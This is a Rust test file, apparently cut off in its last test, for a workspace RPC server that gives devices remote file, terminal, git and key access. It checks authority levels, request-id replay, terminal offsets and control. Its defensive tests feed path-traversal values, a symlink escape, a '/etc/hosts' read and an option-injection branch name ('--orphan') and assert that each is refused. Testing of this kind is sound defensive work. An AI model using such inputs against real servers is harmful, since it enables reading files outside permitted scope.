use std::time::Duration;

use serde_json::{json, Value};

use super::*;
use crate::sink::BroadcastSink;

struct Fixture {
    _dir: tempfile::TempDir,
    root: PathBuf,
    rpc: Arc<WorkspaceRpc>,
    terminals: Arc<Terminals>,
    sink: Arc<BroadcastSink>,
}

impl Drop for Fixture {
    fn drop(&mut self) {
        self.terminals.kill_all();
    }
}

fn fixture() -> Fixture {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap().join("workspace");
    std::fs::create_dir(&root).unwrap();
    let terminals = Arc::new(Terminals::new());
    let sink = Arc::new(BroadcastSink::new(64));
    let rpc = WorkspaceRpc::new(&root, 7, sink.clone(), terminals.clone(), None).unwrap();
    Fixture { _dir: dir, root, rpc, terminals, sink }
}

async fn call(rpc: &Arc<WorkspaceRpc>, peer: &Arc<Peer>, method: &str, params: Value) -> Result<Value, (String, String)> {
    let response = rpc.handle(peer, &json!({ "id": "1", "method": method, "params": params })).await;
    if response["ok"] == true {
        Ok(response["result"].clone())
    } else {
        Err((response["error"]["code"].as_str().unwrap().to_string(), response["error"]["message"].as_str().unwrap().to_string()))
    }
}

async fn manager_peer(rpc: &Arc<WorkspaceRpc>) -> (Arc<Peer>, Notifications) {
    let (peer, events) = Peer::new("device-manage".into(), Authority::Manage);
    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["pty/1", "fs/1", "git/1", "session/1"] }))
        .await
        .unwrap();
    (peer, events)
}

fn code(result: Result<Value, (String, String)>) -> String {
    result.expect_err("expected a refusal").0
}

#[tokio::test(flavor = "multi_thread")]
async fn hello_reports_generation_and_gates_every_method() {
    let f = fixture();
    let (peer, _events) = Peer::new("device".into(), Authority::Manage);
    assert_eq!(code(call(&f.rpc, &peer, "fs.list", json!({})).await), "hello_required");
    let hello = call(&f.rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["fs/1", "zz/1"] })).await.unwrap();
    assert_eq!(hello["runtime"]["runtimeGeneration"], 7);
    assert_eq!(hello["capabilities"], json!(["fs/1"]));
    assert_eq!(hello["authority"], "manage");
    assert_eq!(code(call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-0001" })).await), "capability_not_granted");
    assert_eq!(code(call(&f.rpc, &peer, "desktop.invoke", json!({ "command": "open" })).await), "method_not_found");
    assert!(call(&f.rpc, &peer, "fs.list", json!({})).await.is_ok());
}

#[tokio::test(flavor = "multi_thread")]
async fn participants_cannot_mutate_and_mutations_need_a_request_id() {
    let f = fixture();
    let (participant, _events) = Peer::new("device-participate".into(), Authority::Participate);
    call(&f.rpc, &participant, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["fs/1", "pty/1"] })).await.unwrap();
    assert_eq!(
        code(call(&f.rpc, &participant, "fs.write", json!({ "path": "a.txt", "text": "x", "clientRequestId": "request-0001" })).await),
        "forbidden"
    );
    assert_eq!(code(call(&f.rpc, &participant, "pty.create", json!({ "clientRequestId": "request-0001" })).await), "forbidden");
    let (manager, _events) = manager_peer(&f.rpc).await;
    assert_eq!(code(call(&f.rpc, &manager, "fs.write", json!({ "path": "a.txt", "text": "x" })).await), "invalid_params");
}

#[tokio::test(flavor = "multi_thread")]
async fn paths_cannot_leave_the_workspace() {
    let f = fixture();
    let (peer, _events) = manager_peer(&f.rpc).await;
    std::fs::write(f.root.parent().unwrap().join("secret.txt"), "outside").unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(f.root.parent().unwrap(), f.root.join("escape")).unwrap();
    for path in ["../secret.txt", "/etc/hosts", "a/../../secret.txt"] {
        assert_eq!(code(call(&f.rpc, &peer, "fs.read", json!({ "path": path })).await), "path_forbidden", "{path}");
    }
    #[cfg(unix)]
    {
        assert_eq!(code(call(&f.rpc, &peer, "fs.read", json!({ "path": "escape/secret.txt" })).await), "path_forbidden");
        assert_eq!(
            code(call(&f.rpc, &peer, "fs.write", json!({ "path": "escape/new.txt", "text": "x", "clientRequestId": "request-0002" })).await),
            "path_forbidden"
        );
        // Deleting the link removes the link, not the directory it names.
        call(&f.rpc, &peer, "fs.delete", json!({ "path": "escape", "clientRequestId": "request-0003" })).await.unwrap();
        assert!(f.root.parent().unwrap().join("secret.txt").exists());
    }
    crate::git::run(&f.root, &["init", "-q"]).unwrap();
    assert_eq!(
        code(call(&f.rpc, &peer, "git.stage", json!({ "paths": ["../secret.txt"], "clientRequestId": "request-0004" })).await),
        "path_forbidden"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn writes_are_optimistic_and_a_resend_does_not_write_twice() {
    let f = fixture();
    let (peer, _events) = manager_peer(&f.rpc).await;
    let first = call(&f.rpc, &peer, "fs.write", json!({ "path": "notes.md", "text": "one", "expectedEtag": null, "clientRequestId": "request-0001" }))
        .await
        .unwrap();
    // The same request id with different content is the original's replay.
    let replay = call(&f.rpc, &peer, "fs.write", json!({ "path": "notes.md", "text": "two", "clientRequestId": "request-0001" })).await.unwrap();
    assert_eq!(first, replay);
    assert_eq!(std::fs::read_to_string(f.root.join("notes.md")).unwrap(), "one");
    assert_eq!(
        code(call(&f.rpc, &peer, "fs.write", json!({ "path": "notes.md", "text": "x", "expectedEtag": null, "clientRequestId": "request-0002" })).await),
        "conflict"
    );
    assert_eq!(
        code(call(&f.rpc, &peer, "fs.write", json!({ "path": "notes.md", "text": "x", "expectedEtag": "stale", "clientRequestId": "request-0003" })).await),
        "conflict"
    );
    let read = call(&f.rpc, &peer, "fs.read", json!({ "path": "notes.md" })).await.unwrap();
    assert_eq!(read["text"], "one");
    call(&f.rpc, &peer, "fs.write", json!({ "path": "notes.md", "text": "three", "expectedEtag": read["etag"], "clientRequestId": "request-0004" }))
        .await
        .unwrap();
    call(&f.rpc, &peer, "fs.mkdir", json!({ "path": "docs", "clientRequestId": "request-0005" })).await.unwrap();
    call(&f.rpc, &peer, "fs.rename", json!({ "from": "notes.md", "to": "docs/notes.md", "clientRequestId": "request-0006" })).await.unwrap();
    let listing = call(&f.rpc, &peer, "fs.list", json!({ "path": "docs" })).await.unwrap();
    assert_eq!(listing["entries"][0]["name"], "notes.md");
    // Another attachment reusing the id is a different request.
    let (other, _events) = Peer::new("device-other".into(), Authority::Manage);
    call(&f.rpc, &other, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["fs/1"] })).await.unwrap();
    assert_eq!(
        code(call(&f.rpc, &other, "fs.write", json!({ "path": "notes.md", "text": "x", "expectedEtag": "stale", "clientRequestId": "request-0001" })).await),
        "conflict"
    );
}

/// Output from the next event on until `marker`, returning the offset after
/// it. Earlier bytes may have come with the attach answer or been skipped
/// while waiting for another event, so contiguity is checked from the first
/// event seen here, never assumed from offset 0.
async fn output_until(events: &mut Notifications, marker: &str) -> (String, u64) {
    let mut output = Vec::new();
    let mut end: Option<u64> = None;
    // A real shell starting on a loaded machine; the wait is on its output.
    let deadline = tokio::time::Instant::now() + Duration::from_secs(60);
    loop {
        let event = match tokio::time::timeout_at(deadline, events.recv()).await {
            Ok(event) => event.unwrap(),
            Err(_) => panic!("no {marker} in the terminal's output: {:?}", String::from_utf8_lossy(&output)),
        };
        if event["event"] == "pty.output" {
            let chunk = STANDARD.decode(event["params"]["data"].as_str().unwrap()).unwrap();
            let offset = event["params"]["offset"].as_u64().unwrap();
            if let Some(end) = end {
                assert_eq!(offset, end, "offsets are contiguous");
            }
            end = Some(offset + chunk.len() as u64);
            output.extend(chunk);
            if String::from_utf8_lossy(&output).contains(marker) {
                return (String::from_utf8_lossy(&output).into_owned(), end.unwrap());
            }
        }
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn terminals_stream_with_offsets_replay_and_drop_resent_writes() {
    let f = fixture();
    let (peer, mut events) = manager_peer(&f.rpc).await;
    let created = call(&f.rpc, &peer, "pty.create", json!({ "cols": 100, "rows": 30, "clientRequestId": "request-pty-1" })).await.unwrap();
    let again = call(&f.rpc, &peer, "pty.create", json!({ "cols": 100, "rows": 30, "clientRequestId": "request-pty-1" })).await.unwrap();
    assert_eq!(created, again, "a resent create returns the same terminal");
    let pty_id = created["ptyId"].as_str().unwrap().to_string();
    let attached = call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!(attached["runtimeGeneration"], 7);
    let command = "echo remote-$((6*7))-ok\n";
    assert_eq!(call(&f.rpc, &peer, "pty.write", json!({ "ptyId": pty_id, "data": command, "seq": 1 })).await.unwrap()["applied"], true);
    // A resend of seq 1 after a reconnect is dropped, not typed twice.
    assert_eq!(call(&f.rpc, &peer, "pty.write", json!({ "ptyId": pty_id, "data": command, "seq": 1 })).await.unwrap()["applied"], false);
    let (output, _) = output_until(&mut events, "remote-42-ok").await;
    assert_eq!(output.matches("remote-42-ok").count(), 1, "the command ran once: {output}");

    // A second connection replays from an offset in this generation only.
    let (second, _second_events) = manager_peer(&f.rpc).await;
    let replay = call(&f.rpc, &second, "pty.attach", json!({ "ptyId": pty_id, "sinceOffset": 0, "runtimeGeneration": 7 })).await.unwrap();
    assert!(String::from_utf8_lossy(&STANDARD.decode(replay["data"].as_str().unwrap()).unwrap()).contains("remote-42-ok"));
    assert_eq!(
        code(call(&f.rpc, &second, "pty.attach", json!({ "ptyId": pty_id, "sinceOffset": 0, "runtimeGeneration": 6 })).await),
        "cursor_expired"
    );
    // A forged handle names nothing.
    assert_eq!(code(call(&f.rpc, &second, "pty.write", json!({ "ptyId": "remote-pty-forged", "data": "x", "seq": 1 })).await), "not_found");
    assert_eq!(code(call(&f.rpc, &second, "pty.kill", json!({ "ptyId": "serve-self-test" })).await), "not_found");
    // Unsubscribing someone else's subscription is refused.
    assert_eq!(
        code(call(&f.rpc, &second, "pty.detach", json!({ "subscriptionId": attached["subscriptionId"] })).await),
        "not_found"
    );
    call(&f.rpc, &peer, "pty.kill", json!({ "ptyId": pty_id })).await.unwrap();
}

#[tokio::test(flavor = "multi_thread")]
async fn git_reads_status_and_commits_once() {
    let f = fixture();
    let (peer, _events) = manager_peer(&f.rpc).await;
    for args in [&["init", "-q", "-b", "main"][..], &["config", "user.email", "t@example.com"], &["config", "user.name", "T"]] {
        crate::git::run(&f.root, args).unwrap();
    }
    std::fs::write(f.root.join("a.txt"), "a").unwrap();
    let status = call(&f.rpc, &peer, "git.status", json!({})).await.unwrap();
    assert_eq!(status["files"][0]["path"], "a.txt");
    assert_eq!(status["files"][0]["worktree"], "?");
    call(&f.rpc, &peer, "git.stage", json!({ "paths": ["a.txt"], "clientRequestId": "request-git-1" })).await.unwrap();
    let author = json!({ "name": "Ada", "email": "ada@example.com" });
    let commit = call(&f.rpc, &peer, "git.commit", json!({ "message": "first", "author": author, "clientRequestId": "request-git-2" })).await.unwrap();
    let replay = call(&f.rpc, &peer, "git.commit", json!({ "message": "first", "author": author, "clientRequestId": "request-git-2" })).await.unwrap();
    assert_eq!(commit, replay);
    let log = call(&f.rpc, &peer, "git.log", json!({ "limit": 5 })).await.unwrap();
    assert_eq!(log["commits"].as_array().unwrap().len(), 1);
    assert_eq!(
        code(call(&f.rpc, &peer, "git.checkout", json!({ "branch": "--orphan", "clientRequestId": "request-git-3" })).await),
        "invalid_params"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn hello_and_cursors_follow_a_newer_registered_generation() {
    let f = fixture();
    f.rpc.set_generation(8);
    let (peer, _events) = Peer::new("device".into(), Authority::Manage);
    let hello = call(&f.rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["pty/1"] })).await.unwrap();
    assert_eq!(hello["runtime"]["runtimeGeneration"], 8);
    let created = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-gen-1" })).await.unwrap();
    assert_eq!(
        code(call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": created["ptyId"], "sinceOffset": 0, "runtimeGeneration": 7 })).await),
        "cursor_expired"
    );
}

async fn peer_for(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority) -> (Arc<Peer>, Notifications) {
    let (peer, events) = Peer::new(device.into(), authority);
    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["pty/1"] })).await.unwrap();
    (peer, events)
}

/// The next notification named `event`, skipping others.
async fn next_event(events: &mut Notifications, event: &str) -> Value {
    let deadline = tokio::time::Instant::now() + Duration::from_secs(60);
    loop {
        let next = tokio::time::timeout_at(deadline, events.recv()).await.unwrap_or_else(|_| panic!("no {event}")).unwrap();
        if next["event"] == event {
            return next["params"].clone();
        }
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn terminals_are_listed_with_their_identity_and_survive_a_new_connection() {
    let f = fixture();
    let (peer, mut events) = manager_peer(&f.rpc).await;
    let hello = call(&f.rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["pty/1"] })).await.unwrap();
    let epoch = hello["runtime"]["epoch"].as_str().unwrap().to_string();
    let first = call(&f.rpc, &peer, "pty.create", json!({ "cols": 90, "rows": 20, "clientRequestId": "request-list-1" })).await.unwrap();
    let second = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-list-2" })).await.unwrap();
    assert_eq!(first["epoch"], epoch.as_str());
    assert_eq!((first["number"].as_u64(), second["number"].as_u64()), (Some(1), Some(2)));
    assert_eq!(first["control"], "you");
    assert!(first["pid"].as_u64().is_some());
    let pty_id = first["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    call(&f.rpc, &peer, "pty.write", json!({ "ptyId": pty_id, "data": "echo shell-$$-pid\n", "seq": 1, "writerId": "w1", "epoch": epoch }))
        .await
        .unwrap();
    // The shell itself prints its pid: the listed process is the one running.
    let (_, end) = output_until(&mut events, &format!("shell-{}-pid", first["pid"])).await;

    // The connection goes away (view switch, reconnect, app restart); the
    // same device comes back, finds the terminal and resumes where it was.
    f.rpc.disconnect(&peer);
    let (again, _events) = manager_peer(&f.rpc).await;
    let listed = call(&f.rpc, &again, "pty.list", json!({})).await.unwrap();
    assert_eq!(listed["epoch"], epoch.as_str());
    let terminals = listed["terminals"].as_array().unwrap();
    assert_eq!(terminals.len(), 2);
    assert_eq!(terminals[0]["ptyId"], pty_id.as_str());
    assert_eq!(terminals[0]["pid"], first["pid"]);
    assert_eq!((terminals[0]["cols"].as_u64(), terminals[0]["rows"].as_u64()), (Some(90), Some(20)));
    let resumed = call(&f.rpc, &again, "pty.attach", json!({ "ptyId": pty_id, "sinceOffset": end, "runtimeGeneration": 7, "epoch": epoch })).await.unwrap();
    assert_eq!(resumed["offset"].as_u64(), Some(end));
    assert_eq!(resumed["control"], "you");
    // The writer's seq continues; nothing it sent is typed twice.
    assert_eq!(
        call(&f.rpc, &again, "pty.write", json!({ "ptyId": pty_id, "data": "echo shell-$$-pid\n", "seq": 1, "writerId": "w1" })).await.unwrap()["applied"],
        false
    );
    // An offset or a handle from another runtime process is refused.
    assert_eq!(
        code(call(&f.rpc, &again, "pty.attach", json!({ "ptyId": pty_id, "sinceOffset": 0, "runtimeGeneration": 7, "epoch": "epoch-old" })).await),
        "cursor_expired"
    );
    assert_eq!(
        code(call(&f.rpc, &again, "pty.write", json!({ "ptyId": pty_id, "data": "x", "seq": 2, "writerId": "w1", "epoch": "epoch-old" })).await),
        "not_found"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn input_is_applied_once_in_order_and_backpressure_keeps_it() {
    let f = fixture();
    let (peer, _events) = manager_peer(&f.rpc).await;
    let pty_id = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-order-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    let write = |seq: u64, writer: &str| json!({ "ptyId": pty_id, "data": "true\n", "seq": seq, "writerId": writer });
    assert_eq!(code(call(&f.rpc, &peer, "pty.write", write(2, "w1")).await), "conflict", "a gap is refused, not skipped");
    assert_eq!(call(&f.rpc, &peer, "pty.write", write(1, "w1")).await.unwrap()["applied"], true);
    assert_eq!(call(&f.rpc, &peer, "pty.write", write(1, "w1")).await.unwrap()["applied"], false);
    // A new client instance of the same device numbers from 1 again.
    assert_eq!(call(&f.rpc, &peer, "pty.write", write(1, "w2")).await.unwrap()["applied"], true);
    assert_eq!(code(call(&f.rpc, &peer, "pty.write", write(0, "w2")).await), "invalid_params");
    let big = "x".repeat(MAX_WRITE_BYTES + 1);
    assert_eq!(code(call(&f.rpc, &peer, "pty.write", json!({ "ptyId": pty_id, "data": big, "seq": 2, "writerId": "w1" })).await), "too_large");

    // The program is not reading: the write is refused, its seq is not
    // spent, and the same write goes through once there is room.
    let pending = f.rpc.ptys.lock().unwrap()[&pty_id].input_pending.clone();
    pending.fetch_add(MAX_PENDING_INPUT, Ordering::SeqCst);
    assert_eq!(code(call(&f.rpc, &peer, "pty.write", write(2, "w1")).await), "backpressure");
    pending.fetch_sub(MAX_PENDING_INPUT, Ordering::SeqCst);
    assert_eq!(call(&f.rpc, &peer, "pty.write", write(2, "w1")).await.unwrap()["applied"], true);
}

#[tokio::test(flavor = "multi_thread")]
async fn one_controller_owns_input_and_size_and_viewers_follow() {
    let f = fixture();
    let (desk, mut desk_events) = peer_for(&f.rpc, "device-desk", Authority::Manage).await;
    let (laptop, mut laptop_events) = peer_for(&f.rpc, "device-laptop", Authority::Manage).await;
    let (phone, _phone_events) = peer_for(&f.rpc, "device-phone", Authority::Participate).await;
    let created = call(&f.rpc, &desk, "pty.create", json!({ "cols": 120, "rows": 40, "clientRequestId": "request-own-1" })).await.unwrap();
    let pty_id = created["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    let watching = call(&f.rpc, &laptop, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!(watching["control"], "other");
    assert_eq!(call(&f.rpc, &phone, "pty.list", json!({})).await.unwrap()["terminals"][0]["control"], "other");

    // A second window's size never reshapes the controller's program.
    assert_eq!(code(call(&f.rpc, &laptop, "pty.resize", json!({ "ptyId": pty_id, "cols": 60, "rows": 10 })).await), "not_controller");
    assert_eq!(
        code(call(&f.rpc, &laptop, "pty.write", json!({ "ptyId": pty_id, "data": "ls\n", "seq": 1, "writerId": "l" })).await),
        "not_controller"
    );
    // Participants (the paired phone's scope) never gain input, size or control.
    for (method, params) in [
        ("pty.resize", json!({ "ptyId": pty_id, "cols": 60, "rows": 10 })),
        ("pty.control", json!({ "ptyId": pty_id })),
        ("pty.write", json!({ "ptyId": pty_id, "data": "x", "seq": 1 })),
    ] {
        assert_eq!(code(call(&f.rpc, &phone, method, params).await), "forbidden", "{method}");
    }

    // Taking control is explicit, applies the new controller's size and is
    // announced to every viewer.
    let taken = call(&f.rpc, &laptop, "pty.control", json!({ "ptyId": pty_id, "cols": 100, "rows": 30 })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["cols"].as_u64(), taken["rows"].as_u64()), (Some("you"), Some(100), Some(30)));
    // The loser hears it lost control before the new size, so it follows the size as a viewer.
    assert_eq!(next_event(&mut desk_events, "pty.control").await["control"], "other");
    assert_eq!(next_event(&mut desk_events, "pty.resized").await["cols"], 100);
    assert_eq!(next_event(&mut laptop_events, "pty.control").await["control"], "you");
    assert_eq!(code(call(&f.rpc, &desk, "pty.resize", json!({ "ptyId": pty_id, "cols": 80, "rows": 24 })).await), "not_controller");
    call(&f.rpc, &laptop, "pty.write", json!({ "ptyId": pty_id, "data": "stty size\n", "seq": 1, "writerId": "l" })).await.unwrap();
    output_until(&mut laptop_events, "30 100").await;
}

#[tokio::test(flavor = "multi_thread")]
async fn exit_and_close_are_reported_and_nothing_targets_a_closed_terminal() {
    let f = fixture();
    let (peer, mut events) = manager_peer(&f.rpc).await;
    let pty_id = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-exit-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    call(&f.rpc, &peer, "pty.write", json!({ "ptyId": pty_id, "data": "exit 3\n", "seq": 1, "writerId": "w" })).await.unwrap();
    let exit = next_event(&mut events, "pty.exit").await;
    assert_eq!(exit["ptyId"], pty_id.as_str());
    assert_eq!(code(call(&f.rpc, &peer, "pty.write", json!({ "ptyId": pty_id, "data": "x", "seq": 2, "writerId": "w" })).await), "unavailable");
    // Still listed, with its output, until it is closed.
    let listed = call(&f.rpc, &peer, "pty.list", json!({})).await.unwrap();
    assert_eq!(listed["terminals"][0]["exited"], true);
    let (watcher, mut watcher_events) = peer_for(&f.rpc, "device-watcher", Authority::Participate).await;
    let watching = call(&f.rpc, &watcher, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    call(&f.rpc, &peer, "pty.kill", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!(call(&f.rpc, &peer, "pty.list", json!({})).await.unwrap()["terminals"], json!([]));
    // Whoever still watched it is told, and its subscription is gone.
    assert_eq!(next_event(&mut watcher_events, "pty.closed").await["subscriptionId"], watching["subscriptionId"]);
    assert!(!f.rpc.subscriptions.lock().unwrap().contains_key(watching["subscriptionId"].as_str().unwrap()));
    assert_eq!(code(call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": pty_id })).await), "not_found");

    // Closing a running terminal ends its process and then its entry.
    let running = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-exit-2" })).await.unwrap();
    let running_id = running["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": running_id })).await.unwrap();
    call(&f.rpc, &peer, "pty.kill", json!({ "ptyId": running_id })).await.unwrap();
    assert_eq!(next_event(&mut events, "pty.exit").await["ptyId"], running_id.as_str());
    assert_eq!(code(call(&f.rpc, &peer, "pty.write", json!({ "ptyId": running_id, "data": "x", "seq": 1 })).await), "not_found");
    assert!(!f.terminals.is_live(&running_id));
}

/// Terminal output the test makes itself, delivered exactly as a PTY
/// read would be, so no shell's timing is involved.
fn inject(f: &Fixture, pty_id: &str, bytes: &[u8]) {
    f.rpc.on_pty_data(PtyData { id: pty_id.to_string(), data: STANDARD.encode(bytes) });
}

/// The next event, however long a loaded machine takes to produce it.
async fn next(events: &mut Notifications) -> Value {
    tokio::time::timeout(Duration::from_secs(60), events.recv()).await.expect("an event").unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_connection_that_cannot_keep_up_is_told_to_resume_from_its_offset() {
    let f = fixture();
    let (peer, mut events) = manager_peer(&f.rpc).await;
    let pty_id = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-lag-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    let attached = call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    let subscription = attached["subscriptionId"].as_str().unwrap().to_string();
    let mut end = attached["end"].as_u64().unwrap();
    // The connection's transport is this far behind: the next output ends
    // its stream instead of queueing more.
    peer.queued.fetch_add(MAX_QUEUED_OUTPUT + 1, Ordering::SeqCst);
    inject(&f, &pty_id, b"while-lagging-marker");
    // What it did get is contiguous, and ends with where to resume.
    let lagged_at = loop {
        let event = next(&mut events).await;
        match event["event"].as_str() {
            Some("pty.output") => {
                assert_eq!(event["params"]["offset"].as_u64(), Some(end));
                end += STANDARD.decode(event["params"]["data"].as_str().unwrap()).unwrap().len() as u64;
            }
            Some("pty.lagged") => {
                assert_eq!(event["params"]["subscriptionId"], subscription.as_str());
                break event["params"]["offset"].as_u64().unwrap();
            }
            _ => {}
        }
    };
    assert_eq!(lagged_at, end, "lagged names the first byte not sent");
    assert!(!f.rpc.ptys.lock().unwrap()[&pty_id].subscribers.contains_key(&subscription), "the stream ended");
    assert!(!f.rpc.subscriptions.lock().unwrap().contains_key(&subscription));
    // Once the link has caught up, the client resumes from that byte.
    peer.queued.fetch_sub(MAX_QUEUED_OUTPUT + 1, Ordering::SeqCst);
    let resumed = call(&f.rpc, &peer, "pty.attach", json!({ "ptyId": pty_id, "sinceOffset": lagged_at, "runtimeGeneration": 7 })).await.unwrap();
    assert_eq!((resumed["offset"].as_u64(), resumed["truncated"].as_bool()), (Some(lagged_at), Some(false)));
    let replayed = String::from_utf8_lossy(&STANDARD.decode(resumed["data"].as_str().unwrap()).unwrap()).into_owned();
    assert!(replayed.contains("while-lagging-marker"), "{replayed}");
}

#[tokio::test(flavor = "multi_thread")]
async fn attach_replays_the_ring_in_frames_and_reports_what_it_lost() {
    let f = fixture();
    let (peer, _events) = manager_peer(&f.rpc).await;
    let pty_id = call(&f.rpc, &peer, "pty.create", json!({ "clientRequestId": "request-ring-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    // More than the ring holds, ending with a marker.
    let flood = vec![b'a'; PTY_RING_BYTES + 512 * 1024];
    for chunk in flood.chunks(32 * 1024) {
        inject(&f, &pty_id, chunk);
    }
    inject(&f, &pty_id, b"ring-end-marker");
    let (reader, mut events) = manager_peer(&f.rpc).await;
    let replay = call(&f.rpc, &reader, "pty.attach", json!({ "ptyId": pty_id, "sinceOffset": 0, "runtimeGeneration": 7 })).await.unwrap();
    assert_eq!(replay["truncated"], true, "bytes older than the ring are reported, not faked");
    let first = STANDARD.decode(replay["data"].as_str().unwrap()).unwrap();
    assert_eq!(first.len(), REPLAY_CHUNK, "a replay never outgrows one frame");
    // The rest of the ring follows as ordinary output, in order, before anything live.
    let mut end = replay["end"].as_u64().unwrap();
    let mut rest = Vec::new();
    while !String::from_utf8_lossy(&rest).contains("ring-end-marker") {
        let event = next(&mut events).await;
        if event["event"] == "pty.output" {
            assert_eq!(event["params"]["offset"].as_u64(), Some(end));
            let chunk = STANDARD.decode(event["params"]["data"].as_str().unwrap()).unwrap();
            assert!(chunk.len() <= REPLAY_CHUNK);
            end += chunk.len() as u64;
            rest.extend(chunk);
        }
    }
    assert!(first.len() + rest.len() >= PTY_RING_BYTES - 64 * 1024, "the whole ring was replayed");
}

struct NoAgents;

impl crate::cloud_agents::AgentOps for NoAgents {
    fn tabs(&self) -> Vec<crate::cloud_agents::AgentTabInfo> {
        Vec::new()
    }
    fn busy(&self, _: &str, _: &str) -> bool {
        false
    }
    fn send(&self, _: &str, _: &str, _: &str) -> anyhow::Result<()> {
        Ok(())
    }
    fn stop(&self, _: &str, _: &str) -> anyhow::Result<()> {
        Ok(())
    }
    fn respond(&self, _: &str, _: &str, _: &str, _: &str) -> Result<(), crate::cloud_agents::DecisionError> {
        Err(crate::cloud_agents::DecisionError::NotPending)
    }
    fn answer(&self, _: &str, _: &str, _: &str, _: HashMap<String, String>) -> Result<(), crate::cloud_agents::DecisionError> {
        Err(crate::cloud_agents::DecisionError::NotPending)
    }
    fn configure(&self, _: &str, _: &str, _: &crate::cloud_agents::Settings) -> anyhow::Result<()> {
        Ok(())
    }
    fn note(&self, _: &str, _: &str, _: &str) {}
    fn events(&self, _: &str, _: &str) -> anyhow::Result<Vec<Value>> {
        Ok(Vec::new())
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn the_workspace_key_is_handed_out_over_keys_1_and_only_managers_rotate_it() {
    let f = fixture();
    let agents = crate::cloud_agents::CloudAgents::open(&f._dir.path().join("agents"), Arc::new(NoAgents), None, None, 7).unwrap();
    f.rpc.set_agents(agents.clone());
    let (manager, _events) = Peer::new("device-manage".into(), Authority::Manage);
    call(&f.rpc, &manager, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["session/1"] })).await.unwrap();
    assert_eq!(code(call(&f.rpc, &manager, "keys.get", json!({})).await), "capability_not_granted");
    let (participant, _events) = Peer::new("device-phone".into(), Authority::Participate);
    let hello = call(&f.rpc, &participant, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["session/1", "keys/1"] })).await.unwrap();
    assert_eq!(hello["capabilities"], json!(["session/1", "keys/1"]));
    assert_eq!(agents.attached(), 2, "each connection that said hello counts as attached");
    // The key opens every tab's checkpoint; participants see no tabs.
    assert_eq!(code(call(&f.rpc, &participant, "keys.get", json!({})).await), "forbidden");
    let (keyholder, _events) = Peer::new("device-desk".into(), Authority::Manage);
    call(&f.rpc, &keyholder, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["keys/1"] })).await.unwrap();
    let handout = call(&f.rpc, &keyholder, "keys.get", json!({})).await.unwrap();
    let (current, key) = agents.keys.current().unwrap();
    assert_eq!(handout["currentKeyId"], current);
    assert_eq!(handout["keys"][0]["key"], crate::cloud_agents::crypto::b64(&key));
    assert_eq!(code(call(&f.rpc, &participant, "keys.rotate", json!({ "clientRequestId": "request-0001" })).await), "forbidden");
    // Nothing is shared with a participant, so it sees no agent tabs.
    assert_eq!(call(&f.rpc, &participant, "session.tabs", json!({})).await.unwrap()["tabs"], json!([]));
    assert_eq!(
        code(call(&f.rpc, &participant, "session.configure", json!({ "sessionId": "s", "tabId": "t", "clientRequestId": "request-0002" })).await),
        "forbidden"
    );
    f.rpc.disconnect(&participant);
    f.rpc.disconnect(&participant);
    assert_eq!(agents.attached(), 2, "a connection is counted once");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_manager_rotates_the_key_and_nudges_the_mailbox() {
    let f = fixture();
    let agents = crate::cloud_agents::CloudAgents::open(&f._dir.path().join("agents"), Arc::new(NoAgents), None, None, 7).unwrap();
    f.rpc.set_agents(agents.clone());
    let (manager, _events) = Peer::new("device-manage".into(), Authority::Manage);
    call(&f.rpc, &manager, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ["session/1", "keys/1"] })).await.unwrap();
    let before = agents.keys.current().unwrap().0;
    let rotated = call(&f.rpc, &manager, "keys.rotate", json!({ "clientRequestId": "request-0001" })).await.unwrap();
    assert_ne!(rotated["currentKeyId"], before);
    let again = call(&f.rpc, &manager, "keys.rotate", json!({ "clientRequestId": "request-0001" })).await.unwrap();
